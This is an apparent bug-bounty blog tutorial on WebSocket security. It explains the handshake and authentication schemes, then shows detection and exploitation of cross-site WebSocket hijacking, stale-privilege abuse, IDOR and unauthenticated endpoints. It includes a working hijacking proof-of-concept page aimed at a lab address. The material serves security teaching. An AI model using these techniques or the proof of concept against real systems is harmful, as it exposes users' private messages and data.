---
layout: post
title: "Bug Hunter's Practical Manual on WebSockets"
date: 2026-08-22 08:00:00 +0100
categories: [WebSocket, Web Security]
tags: [WebSocket, ws, AppSec]
---

In this blog, I aim to provide bug hunters and pentesters with almost all they need to know to start hacking applications that utilize WebSockets, as it's a huge attack surface that usually goes under the radar in engagements. This blogs starts off by clearing the foundations that you need to easily understand attacks related to WS, because immediately hopping into the bugs and exploits will not make much sense, especially if you are the type of hacker who is not into checklists. Also, I built a lab with most of the bug explained in this blog, so you can get your hands dirty, not just another boring blog post.

## 1. Primer on WebSockets
The WebSocket protocol enables ongoing, full-duplex, bidirectional communication between web servers and web clients over an underlying TCP connection.

```
        ┌──────────┐                    ┌──────────┐
        │  Client  │                    │  Server  │
        └────┬─────┘                    └────┬─────┘
             │                               │
             │      Initial HTTP             │
             │       handshake               │
             ├──────────────────────────────►│
             │◄──────────────────────────────┤
             │                               │
             │      WebSockets               │
             │      full-duplex              │
             │      persistent               │
             │◄─────────────────────────────►│
             │                               │
             │         Close                 │
             ├──────────────────────────────►│
             │◄──────────────────────────────┤
```

In simple terms, the WS protocol consists of two phases; an opening handshake done over HTTP, where the HTTP connection is upgraded to WS, leading to opening a communication channel over the same underlying connection, which is then used by the two parties of the connection (client/server) to send data back and forth at will, independently of each other.

As stated by the [official website](https://websocket.org/guides/websocket-protocol/):
> The WebSocket protocol (RFC 6455) upgrades an HTTP connection to a persistent, full-duplex channel. After a handshake, client and server exchange lightweight frames - text, binary, or control - with minimal overhead. It works over HTTP/1.1, HTTP/2, and HTTP/3.

### URI Structure
```
wss://example.com:443/websocket/demo?foo=bar
└─┘   └──────────┘ └─┘ └────────────┘ └─────┘
 │         │        │        │           │
 │         │        │        │           └── Query
 │         │        │        └───────────── Path
 │         │        └────────────────────── Port
 │         └─────────────────────────────── Host
 └───────────────────────────────────────── Scheme
```

- The WebSocket protocol defines two URI schemes for traffic between server and client
  - **ws**: used for unencrypted connections -> default port 80
  - **wss**: used for secure, encrypted connections over Transport Layer Security (TLS) -> default port 443
- Fragment identifiers are not allowed in WebSocket URIs
  - The hash character (`#`) must be escaped as `%23`
 
### Opening Handshake
Client does not directly hop to using WS, instead, client has to issue an upgrade request over an HTTP GET request. The server then, if it supports WS, and the conditions it imposes are met, responds with a WebSocket handshake response.
```
   ┌──────────┐                              ┌──────────┐
   │  Client  │                              │  Server  │
   └──────┬───┘                              └──────┬───┘
         │                                          │
         │  GET /chat HTTP/1.1                      │
         │  Host: example.com                       │
         │  Upgrade: websocket                      │
         │  Connection: Upgrade                     │
         │  Sec-WebSocket-Key: [base64]             │
         │  Sec-WebSocket-Version: 13               │
         ├─────────────────────────────────────────►│
         │                                          │
         │  HTTP/1.1 101 Switching Protocols        │
         │  Upgrade: websocket                      │
         │  Connection: Upgrade                     │
         │  Sec-WebSocket-Accept: [hash]            │
         │◄─────────────────────────────────────────┤
         │                                          │
         │       WebSocket Connection               │
         │◄────────────────────────────────────────►│
         │                                          │
```

#### 1. Client handshake request
A Websocket handshake request is a normal GET request to a special endpoint, with some special required headers, to indicate to the server that the client is willing to upgrade the connection from HTTP to WS:
```http
GET /chat HTTP/1.1
Host: example.com:8000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

- `Upgrade: websocket` - indicates that the client wants to upgrade the connection to use the WebSocket protocol
- `Connection: Upgrade` - tells proxies or other intermediaries to also upgrade the connection
- `Sec-WebSocket-Key` - a Base64-encoded random value that helps the server prove it’s a WebSocket-capable server (automatically set by the browser)
- `Sec-WebSocket-Version` - the version of the WebSocket protocol the client wishes to use (almost always 13)

#### 2. Server handshake response
Once the server receives the handshake request, if it supports WS and accepts the request to upgrade, it responds with a `101 Switching Protocols` HTTP response:
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

- `HTTP/1.1 101 Switching Protocols` - indicates the successful upgrade from HTTP to WebSocket
- `Upgrade: websocket` - confirms the protocol upgrade
- `Connection: Upgrade` - indicates that the connection has been upgraded
- `Sec-WebSocket-Accept` - a value calculated from the client’s Sec-WebSocket-Key, which helps verify that the server understood the WebSocket handshake request

## 2. WebSocket Authentication Mechanics
As the official documentation states, the browser WebSocket API has no way to set custom HTTP headers, so it's up to the devs to choose the mechanism they wish to verify identity.
```js
// This is the entire browser WebSocket API for connection setup.
// Notice: no headers parameter, no options object.
const ws = new WebSocket("wss://example.com/ws");
// Compare with fetch, which supports arbitrary headers:
// fetch(url, { headers: { Authorization: "Bearer ..." } })
```

What we need to keep in mind, is that as we've seen already that WebSockets are stateful, meaning after the first handshake between the client and the server, they from now on know each other, and there is no need to send the auth token or cookie with each request (typically called a message in WS) unlike with HTTP. But, how does the server prove client's identity then? It happens at the handshake actually, with the first HTTP GET request sent by the client with the `Upgrade`, `Connection`, `Sec-WebSocket-Key`... headers, the client also usually attaches a cookie (or other methods we will see in just a bit) to the request, and the server verifies then caches the user's data from the cookie, only then it responds with `101`. And after that, a communication channel is open between the client and server and there is no need to send the cookie or any other auth mechanism at all. This is so important, so keep it in mind.

There exists currently three approaches to prove identity for WS, each comes with pros and cons.

**Note:** The code samples below are pseudo codes, keeping only the important parts to understand how each mechanism works.

### 2.1 URL query parameter authentication
Pass the token in the WebSocket URL. The server validates it during the HTTP upgrade handshake, before the connection is established.

**Client**
```js
const ws = new WebSocket(
  `wss://example.com/ws?token=${encodeURIComponent(token)}`
);
```

**Server**
```js
server.on("upgrade", (req, socket, head) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const token = url.searchParams.get("token");

  const user = validateToken(token);

  // Auth token is not valid, reject the upgrade
  if (!user) {
    socket.write("HTTP/1.1 401 Unauthorized\r\n\r\n");
    socket.destroy();
    return;
  }

  // Auth token is valid, so upgrade
  wss.handleUpgrade(req, socket, head, (ws) => {
    ws.user = user; //  <--  user's data caching
    wss.emit("connection", ws, req);
  });
});
```

### 2.2 Cookie-based authentication
If your WebSocket server shares a domain with your web application, cookies set during the HTTP login flow are automatically sent with the WebSocket upgrade request.

**Client**
```js
// no special handling needed; cookies are attached
// automatically if the WebSocket is on the same domain
const ws = new WebSocket("wss://example.com/ws");
```

**Server**
```js
server.on("upgrade", (req, socket, head) => {
  // Session extracted from cookie
  const sessionId = parseCookie(req.headers.cookie, "session_id");
  const session = sessionStore.get(sessionId);

  // Session Invalid => reject upgrade
  if (!session || session.expired()) {
    socket.write("HTTP/1.1 401 Unauthorized\r\n\r\n");
    socket.destroy();
    return;
  }

  // Session valid => upgrade
  wss.handleUpgrade(req, socket, head, (ws) => {
    ws.user = session.user;
    wss.emit("connection", ws, req);
  });
});
```

### 2.3 First-message authentication
Open the connection without credentials, then send the token as the first message. The server validates before processing anything else. This method is rarely used.

**Client**
```js
const ws = new WebSocket("wss://example.com/ws");

// immediately send token to WS server
ws.onopen = async () => {
  ws.send(JSON.stringify({ type: "auth", token }));
};
```

**Server**
```js
// set up the connection with an auth timeout
wss.on("connection", (ws) => {
  ws.authenticated = false;

  // close connection if user does not provide a valid auth token within 5 seconds
  const authTimeout = setTimeout(() => {
    if (!ws.authenticated) ws.close(4001, "Auth timeout");
  }, 5000);

  ws.on("message", (data) => {
      const msg = JSON.parse(data);

      const user = validateToken(msg.token);

      // token invalid, close connection
      if (!user) {
        ws.close(4001, "Invalid token");
        return;
      }

      // token valid, cache, and keep connection open
      ws.authenticated = true; // cached, so connection is authenticated from now on
      ws.user = user; // user data cached

      return;
    }
  });
});
```

## 3. WebSockets Vulnerabilities
As part of WebSocket hunting, is gathering all `ws://` and `wss://` endpoints from your target's JS files, HTML source code. This step is important in all cases, whether you are hunting for auhenticated/unauthenticated IDOR, SSRF, RCE... It does not matter what bug you might find, what matters is that you correctly and effectively map the attack surface, then test against the typical bugs. In this guide I will focus on the bugs that are directly related to misconfigured WebSockets and not the typical bugs that happen in HTTP as well.

### 3.1 Cross-Site WebSocket Hijacking
This is the top, most discussed bug when it comes to WebSockets, and that's for a clear reason; the great impact it can cause. Testing this bug is easy, and its impact can be devastating, however, in recent years its exploitation became a little harder, as SOP is on all browsers and any well-maintained website nowadays restricts auth cookies with `SameSite`, but, with all this, we still see it emerging in bug reports until today, and that's because only depending on the `SameSite` flag is not the ultimate mitigation. If initial detection tells you that this target is potentially vulnerable to CSWSH, and you have compromised a subdomain of your target, via a subdomain takeover for example, or an XSS on the same domain or a subdomain, then this can be used to perform websocket hijacking, and potentially get read & write access to the vulnerable websocket.

#### 3.1.1 Detection
While doing your usual testing, you notice an endpoint that performs an upgrade to websocket, the quickest way to test if the websocket is **initially** vulnerable to CSWSH, is to alter the `Origin` header to any random value, or to another subdomain you have taken over, and watch if the response is `101`, if that's the case, then you got a confirmed CSWSH.

<img width="1729" height="469" alt="image" src="https://github.com/user-attachments/assets/ab293cc1-c3e1-4b53-8244-7388894629c7" />

In the above screenshot, the target application performed a websocket upgrade request so that the user's communication between the chat's two parties is done via websocket smoothly, however, altering the `Origin` header didn't trigger the backend to refuse the upgrade, meaning it accepts upgrade requests from any origin, making the ws connection vulnerable to hijacking.

#### 3.1.2 Exploitation
To exploit the above behavior, and due to the SOP enforced on all modern web browsers, we have to run the exploit from a subdomain of the target we are trying to exploit.

1. Host a web page with JavaSscript code that simply connects to the vulnerable websocket endpoint, and listens for messages
2. Send the link to the victim, and while the exploitation page is open and the victim is using the websocket, any messages sent or received by the victim are accessed by the attacker

The script in our example is something like:
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CSWSH Lab - Attacker Page</title>
</head>
<body>
  <h1>CSWSH Test</h1>
  <pre id="output">Connecting...</pre>

  <script>
    const output = document.getElementById("output");

    // the vulnerable ws endpoint
    const conversationId = "b89bc0b8-f739-4e41-a052-ae56f7754946";

    const ws = new WebSocket(
      `ws://192.168.100.103:3000/ws/${conversationId}`
    );

    ws.onopen = () => {
      output.textContent += "\n[+] WebSocket connected";

      // Test message.
      ws.send("CSWSH test message");
    };

    ws.onmessage = (event) => {
      output.textContent += "\n[+] Received: " + event.data;
      console.log("[CSWSH] Received:", event.data);
    };

    ws.onerror = (event) => {
      output.textContent += "\n[-] WebSocket error";
      console.log("[CSWSH] Error:", event);
    };

    ws.onclose = (event) => {
      output.textContent +=
        `\n[*] Connection closed (${event.code})`;
    };
  </script>
</body>
</html>
```

<img width="2128" height="1067" alt="image" src="https://github.com/user-attachments/assets/f5f14ef8-4627-4705-8fa0-1b7d9ab27704" />
*Victim is chatting via websocket, while the exploit page is open in another tab*

<img width="2155" height="420" alt="image" src="https://github.com/user-attachments/assets/37042fcb-f55d-4730-b843-c6a1efbcf00d" />
*Messages are being intercepted in real time*

<img width="2155" height="1107" alt="image" src="https://github.com/user-attachments/assets/4ead5598-5198-478f-b076-386eadbbf790" />

<img width="2155" height="435" alt="image" src="https://github.com/user-attachments/assets/b9f7ed84-243f-4ed1-855a-08199da8e7e9" />

### 3.2 Missing Post-Authentication Token Validation
We saw earlier that authentication in websockets is done only in handshake, and there is no need to keep sending the auth token or cookie with every message to the server like we do with HTTP. But, this does not mean that we totally leave off server-side checks for privileges and access controls. Server-side validation is a must, no matter what the underlying protocol you are using. The only difference here, is that WS remembers who the client is for the duration of the connection, so it already cached your information during the handshake, it only needs to use those info to validate that you have the privs you need to do the action you are requesting to do. And that's what many devs simply think is not required when dealing with WebSockets.

#### 3.2.1 Detection
While testing, always keep an eye on actions that change the privileges and access levels a user have. For example, an admin changes privs for an org member from read/write to read-only. If certain actions are carried through websockets, a good example, is applications that allow real-time document editing, like Figma... Always try to continue to do actions that admin "revoked" for you, and notice if they successfully go through. In the Figma case, after the admin changes your privs, and while staying in the application, try to modify a file and see if it actually works. If it does, that means that the ws backend is not checking your privileges in real-time, and only does so in the handshake, that's why when you continue editing the file while you are in the same WS connection that was established with your old token that has the higher privileges, the server just allows you to so, because it thinks that you have the right access level, as it hasn't yet been updated with your current privileges.

#### 3.2.2 Exploitation
As a practical example, I implemented a scenario I saw multiple times in bug bounty. A block functionality in chatting apps, that are poorly implemented and allows the attacker to continue sending messages after being blocked by the victim, as soon as the attacker is still on the original connection.

1. Two users are chatting, the underlying protocol used to deliver messages is WS
2. UserA blocks UserB, UI is frozen, and supposedly they cannot send messages to each other from now on
<img width="2155" height="1188" alt="image" src="https://github.com/user-attachments/assets/807b30a8-959e-482c-8917-c89be172363b" />
3. UserB already intercepted some messages while chatting, now he simply can change the content of the message and replay
<img width="2155" height="854" alt="image" src="https://github.com/user-attachments/assets/8ab74938-444f-4936-96e4-f0eda0488048" />
<img width="2141" height="1227" alt="image" src="https://github.com/user-attachments/assets/1b13b710-261f-40f0-bd19-378860da8c7d" />

**Note:** by staying on the same connection, we mean, not refreshing the page (if you are on the browser), because that would cause tthe JS to be reloaded and the WebSocket connection reestablished with the new auth token.

### 3.3 Broken Object Level Authorization
The good old IDOR, but this time not at the HTTP level, which makes it missed by many hunters and pentesters.
Keep in mind that this is a post-auth IDOR, meaning that the attacker has authenticated during the handshake, so a pre-requisite for this bug, is the attacker having an account on the app. 

#### 3.3.1 Detection
Going through WebSockets history in Burp you will not notice any IDs if the WS endpoint is expecting IDs in query parameters
<img width="2156" height="576" alt="image" src="https://github.com/user-attachments/assets/5ccf113c-91d2-48d2-a794-90237dcac863" />

You got to send any WS endpoint you suspect to Repeater, click the pen, and clone the request you want to see in more detail
<img width="2156" height="992" alt="image" src="https://github.com/user-attachments/assets/bb2dce86-9ca7-4279-b403-21d972ef50e5" />

Notice that there is a query param `userId` that's worth testing for IDOR.

#### 3.3.2 Exploitation
After noticing that the chatting application only lets us to view the information related to the person we are chatting with, this makes it clear that users are not allowed to simple mass dump all users in the app without knowing their invitation code.

<img width="1639" height="953" alt="image" src="https://github.com/user-attachments/assets/dfa52d4c-adbc-4534-9397-093e6ace1aaf" />
*Changing userId to 2, returns data related to another user we don't have a direct chat with*
<img width="2159" height="1194" alt="image" src="https://github.com/user-attachments/assets/11af1d16-f218-4408-944d-191dbfe5b166" />

### 3.4 Unauthenticated BOLA/BFLA
This is an extension of the above bug, but more impactful with a simpler attack complexity. Attacker does not have to hold any auth tokens to access/modify sensitive data, making it a crit in almost all bug bounty programs, unlike the previous one, which is high at most.

#### 3.4.1 Exploitation
As part of your info gathering, you found an endpoint in the HTML source code, that you didn't find earlier while going through Burp history, and that might be because the devs have suspended the use of this functionality at the app, but maybe the websocket is still repsonding?
```
wss://target.tld/ws/fullnames?userId=1000
```

To easily test unauthenticated WS endpoints, use Postman and make sure to set protocol to WebSocket
<img width="2167" height="1457" alt="image" src="https://github.com/user-attachments/assets/b9c75336-7d70-4b42-a68a-4b84782adf8a" />

These endpoints allow upgrade to ws without the server requiring an auth token, which in case of endpoints that returns sensitive data is totally devastating.

---

Hope you learned a new trick.

**STAY SHARP!**
